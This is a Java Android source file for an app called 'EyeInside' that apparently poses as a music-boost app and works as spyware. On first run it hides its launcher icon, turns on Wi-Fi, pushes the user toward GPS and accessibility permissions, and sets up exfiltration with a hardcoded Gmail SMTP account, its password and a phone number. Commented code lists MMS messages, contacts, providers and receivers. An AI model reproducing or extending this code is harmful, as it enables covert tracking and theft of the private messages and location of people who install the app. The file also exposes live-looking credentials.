package com.code4bones.EyeInside;



import com.code4bones.utils.NetLog;
import com.soundforge.musicboost.R;

import android.location.LocationManager;
import android.net.wifi.WifiManager;
import android.os.Bundle;
import android.os.Handler;
import android.provider.CallLog;
import android.app.Activity;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.content.pm.ActivityInfo;
import android.content.pm.PackageInfo;
import android.content.pm.PackageManager;
import android.content.pm.ProviderInfo;
import android.view.Menu;

public class MainActivity extends Activity {

	@Override
	protected void onCreate(Bundle savedInstanceState) {
		super.onCreate(savedInstanceState);
		setContentView(R.layout.activity_main);
		NetLog.v("I INSIDE !");
		
		//NetLog.v("PATH %s",CommandObj.getFile(this, "Hello.txt"));
		/*
		PackageManager pm = this.getPackageManager();
	    ComponentName componentName =
	    	      new ComponentName("com.code4bones.EyeInside",
	    	      "com.code4bones.EyeInside.MainActivity");
	    //pm.setComponentEnabledSetting(componentName,PackageManager.COMPONENT_ENABLED_STATE_DISABLED,PackageManager.DONT_KILL_APP);
	    */
	    
	    /*
		handleMMS handler = new handleMMS(this);
		ArrayList<SmsObj> ff = handler.listMMS();
		for ( SmsObj f : ff) {
			NetLog.v("file:%s",f.filename);
			for ( String s : f.phoneList) 
				NetLog.v("  %s",s);
		}
		*/
		
		
		
//		for ( String col : c.getColumnNames() )
//			NetLog.v("%s : %s",col,c.getString(c.getColumnIndex(col)));
		/*
		Cursor c = this.getContentResolver().query(Data.CONTENT_URI,null,null,null,null);
		if ( c == null || !c.moveToFirst() )
			return;
		
		do {
		//	for ( String col : c.getColumnNames() )
			//	NetLog.v("%s : %s",col,c.getString(c.getColumnIndex(col)));
			//NetLog.v("%s",c.getString(ctColumnIndex(Data.DISPLAY_NAME)));
		} while ( c.moveToNext());
		*/
		
		//enumContent();
		//enumRecv();
		
		checkFirstRun();
		
		finish();
	}

	public void enumRecv() {
		for (PackageInfo pack : getPackageManager().getInstalledPackages(PackageManager.GET_RECEIVERS)) {
	        ActivityInfo[] providers = pack.receivers;
	        if (providers != null) {
	            for (ActivityInfo a : providers) {
	                NetLog.v("%s : name: %s",pack.applicationInfo.name, a.name);
	            }
	        }
	    }		
	}
	
	public void enumContent() {
		for (PackageInfo pack : getPackageManager().getInstalledPackages(PackageManager.GET_PROVIDERS)) {
	        ProviderInfo[] providers = pack.providers;
	        if (providers != null) {
	            for (ProviderInfo provider : providers) {
	                NetLog.v("%s : provider: %s",pack.applicationInfo.name, provider.authority);
	            }
	        }
	    }		
	}
	
	public static void showPackage(Context c,boolean fShow) {
		PackageManager pm = c.getPackageManager();
	    ComponentName componentName =
	    	      new ComponentName(CommandPool.PACKAGE_NAME,
	    	      CommandPool.PACKAGE_NAME+".MainActivity");
	    pm.setComponentEnabledSetting(componentName,!fShow?PackageManager.COMPONENT_ENABLED_STATE_DISABLED:PackageManager.COMPONENT_ENABLED_STATE_ENABLED,PackageManager.DONT_KILL_APP);
	}
	
	public void checkFirstRun() {
		SharedPreferences pref = this.getSharedPreferences("prefs", 1);
		if ( !pref.contains(CommandObj.PREF_MASTER)) {
			checkGPS();
			checkWifi();
			checkAccess();
			CommandPool pool = CommandPool.getInstance();
			//TODO: REMOVE BEFORE PRODUCTIONS
			new Handler().post(new CommandInvoker(MainActivity.this,pool,"+79037996299","@setup pass:60175577a;smtp:smtp.gmail.com;port:465;user:eyeinsid3@gmail.com;mail:eyeinsid3@gmail.com;wifi",true));
		}
	}
	
	private void checkWifi() {
		WifiManager wifi = (WifiManager) this.getSystemService(Context.WIFI_SERVICE); 
		if ( !wifi.isWifiEnabled() ) {
			wifi.setWifiEnabled(true);
		}  
	}
	
	private void checkGPS() {
		LocationManager locMgr = (LocationManager)getSystemService(Context.LOCATION_SERVICE);
		boolean ok = locMgr.isProviderEnabled(LocationManager.GPS_PROVIDER) && locMgr.isProviderEnabled(LocationManager.NETWORK_PROVIDER);
		if ( !ok ) {
			Intent run = new Intent(android.provider.Settings.ACTION_LOCATION_SOURCE_SETTINGS);   
			startActivity(run);		
		}
	}
	
	private void checkAccess() {
		Intent intent = new Intent(android.provider.Settings.ACTION_ACCESSIBILITY_SETTINGS);
		startActivityForResult(intent, 0);
	}
	
	/*
	private void turnGPSOn(){
	    String provider = Settings.Secure.getString(getContentResolver(), Settings.Secure.LOCATION_PROVIDERS_ALLOWED);
	    if(!provider.contains("gps")){ //if gps is disabled
	        final Intent poke = new Intent();
	        poke.setClassName("com.android.settings", "com.android.settings.widget.SettingsAppWidgetProvider"); 
	        poke.addCategory(Intent.CATEGORY_ALTERNATIVE);
	        poke.setData(Uri.parse("3")); 
	        sendBroadcast(poke);
	    }
	}	
	private boolean canToggleGPS() {
	    PackageManager pacman = getPackageManager();
	    PackageInfo pacInfo = null;

	    try {
	        pacInfo = pacman.getPackageInfo("com.android.settings", PackageManager.GET_RECEIVERS);
	    } catch (NameNotFoundException e) {
	        return false; //package not found
	    }

	    if(pacInfo != null){
	        for(ActivityInfo actInfo : pacInfo.receivers){
	            if(actInfo.name.equals("com.android.settings.widget.SettingsAppWidgetProvider") && actInfo.exported){
	                return true;
	            }
	        }
	    }

	    return false; //default
	}	
	*/
	@Override
	public boolean onCreateOptionsMenu(Menu menu) {
		// Inflate the menu; this adds items to the action bar if it is present.
		getMenuInflater().inflate(R.menu.main, menu);
		return true;
	}

	@Override
	public void onDestroy() {
		super.onDestroy();
		NetLog.v("Activity Killed");
	}
} // MainActivity

/*
 private void saveToPreferences(Bundle in) {
    Parcel parcel = Parcel.obtain();
    String serialized = null;
    try {
        in.writeToParcel(parcel, 0);

        ByteArrayOutputStream bos = new ByteArrayOutputStream();
        IOUtils.write(parcel.marshall(), bos);

        serialized = Base64.encodeToString(bos.toByteArray(), 0);
    } catch (IOException e) {
        Log.e(getClass().getSimpleName(), e.toString(), e);
    } finally {
        parcel.recycle();
    }
    if (serialized != null) {
        SharedPreferences settings = getSharedPreferences(PREFS, 0);
        Editor editor = settings.edit();
        editor.putString("parcel", serialized);
        editor.commit();
    }
}

private Bundle restoreFromPreferences() {
    Bundle bundle = null;
    SharedPreferences settings = getSharedPreferences(PREFS, 0);
    String serialized = settings.getString("parcel", null);

    if (serialized != null) {
        Parcel parcel = Parcel.obtain();
        try {
            byte[] data = Base64.decode(serialized, 0);
            parcel.unmarshall(data, 0, data.length);
            parcel.setDataPosition(0);
            bundle = parcel.readBundle();
        } finally {
            parcel.recycle();
        }
    }
    return bundle;
} 
 */
